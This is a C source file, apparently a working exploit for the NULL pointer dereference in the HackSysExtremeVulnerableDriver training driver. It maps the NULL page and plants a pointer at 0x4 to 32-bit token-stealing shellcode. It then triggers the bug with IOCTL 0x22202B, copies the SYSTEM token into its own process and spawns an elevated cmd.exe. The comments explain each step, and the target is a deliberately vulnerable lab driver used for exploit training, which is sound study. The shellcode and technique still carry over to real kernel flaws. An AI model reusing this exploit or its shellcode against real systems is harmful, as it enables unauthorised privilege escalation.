#include "stdafx.h"
#include "windows.h"
#include "Winternl.h"
#include "stdio.h"
#pragma comment(lib,"ntdll.lib")

/*
	As there is no header file which defines NtAllocateVirtualMemory we will define our own copy of the function,
	which we will name _NtAllocateVirtualMemory, given what we know. This is all because the function is technically
	undefined and not exported to the public so we need to tell the compiler what the function should be expecting as input
	and what it will return.

	NTSTATUS as this is what the function returns (technically defined at __success(return >= 0) ). 
	WINAPI as this is the calling convention (it is a macro that evaluates to __stdcall aka stdcall, the standard calling convention) (https://stackoverflow.com/questions/3378622/how-to-understand-the-ntstatus-nt-success-typedef-in-windows-ddk)

	We need to define this as such (with (WINAPI *_NtAllocateVirtualMemory) ) as to distingush the fact that we are declaring a function pointer, rather than
	a function returning a pointer, we need to wrap it in parenthesis as such:
	
	(WINAPI *_NtAllocateVirtualMemory)
	
	See https://stackoverflow.com/questions/34968342/cannot-understand-this-c-typedef for a better explaination on this than I can type.
	*/
typedef NTSTATUS(WINAPI *_NtAllocateVirtualMemory)(
	HANDLE ProcessHandle, 
	PVOID *BaseAddress, 
	ULONG_PTR ZeroBits, 
	PSIZE_T AllocationSize, 
	ULONG AllocationType, 
	ULONG Protect
);

int main()
{
	printf("Triggering NULL pointer dereference\r\n");
	printf("Opening handle to device \\\\\\\\.\\\\HackSysExtremeVulnerableDriver...\r\n");
	HANDLE deviceHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);
	if (deviceHandle == INVALID_HANDLE_VALUE) {
		printf("Failed to open handle to device driver. :( \r\n");
		return 1;
	}
	printf("\r\nSending fake user input of 0xFAD1FAD1 so we bypass the check for normal\r\noperations (which occurs when we send 0xBAD0B0B0) and instead\r\nuse a null pointer as the location of a callback address\r\n\r\n");
	char inBuffer[20] = "\xD1\xFA\xD1\xFA";
	DWORD outBytes = 0;
	
	int baseAddress = 0x1; // This will be rounded down to 0. If we just entered 0, it would be the same as specifying NULL, so the function would likely just quit, and say our input is wrong.
	int allocationSize = 2048; // A nice number, we can probably allocate less memory though, but this works okay.
	int result = 333; // Lets set this to 333 so when NtAllocateVirtualMemory returns successfully, we can see this get set to 0, or alteratively to something like 0xC0000005 if there was an error.
	
	printf("Getting address of NtAllocateVirtualMemory from ntdll.dll\r\n");
	/*
		We don't know where in memory NtAllocateVirtualMemory is stored prior to this so we use GetModuleHandleW to first get the address where ntdll.dll is located in memory.
		From this we can then use a HANDLE to this address to then get the address where NtAllocateVirtualMemory is located within the currently loaded ntdll.dll.
	*/
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
	
	/*
		
	*/
	printf("Allocating NULL page using NtAllocateVirtualMemory\r\n");
	result = NtAllocateVirtualMemory(GetCurrentProcess(), (PVOID *) &baseAddress, 0, (PSIZE_T) &allocationSize, 0x3000, 0x40);
	if (result != 0) {
		printf("Failed to allocate NULL page. :(\r\n");
	}
	else {
		printf("Success! Allocated NULL page!\r\n");
	}
	printf("Mapping 0x00000004 to shellcode\r\n");
	char shellcode[60] = (
		"\x60" // PUSHAD
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
		"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
		"\xC3" // RET
	);
	printf("\r\nShellcode size: %i\r\n", sizeof(shellcode));
	printf("Allocating rwx memory for shellcode using VirtualAlloc\r\n");
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Address of rwx memory: 0x%08x\r\n", shellcodeAddress);
	printf("\r\nCopying shellcode in memory (which is not executable atm) to executable\r\nlocation we created with VirtualAlloc\r\n\r\n");
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	printf("Getting pointer to address of shellcode so memcpy will dereference\r\nthe pointer,get the address of our shellcode, and copy this address\r\nto 0x00000004.\r\n\r\n");
	LPVOID theShellcodeAddress = &shellcodeAddress;

	printf("Copying address of shellcode to 0x00000004 using memcpy\r\n");
	void * returnResult = memcpy((LPVOID) 0x00000004, theShellcodeAddress, 4);
	printf("\r\nDevice IOCTL: 0x22202B\r\n");
	printf("InBuffer: 0x%2x%2x%2x%2x\r\n", inBuffer[3] & 0xff, inBuffer[2] & 0xff, inBuffer[1] & 0xff, inBuffer[0] & 0xff);
	printf("Size of InBuffer: %i", sizeof(inBuffer));
	printf("\r\nSending IOCTL message to driver...\r\n");
	DeviceIoControl(deviceHandle, 0x22202B, &inBuffer, sizeof(inBuffer), NULL, 0, &outBytes, (LPOVERLAPPED)NULL);

	printf("\r\nOkay we should have stolen the token now. Creating cmd.exe with new permissions.");
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	printf("Annnnd presto :D\r\n");
}

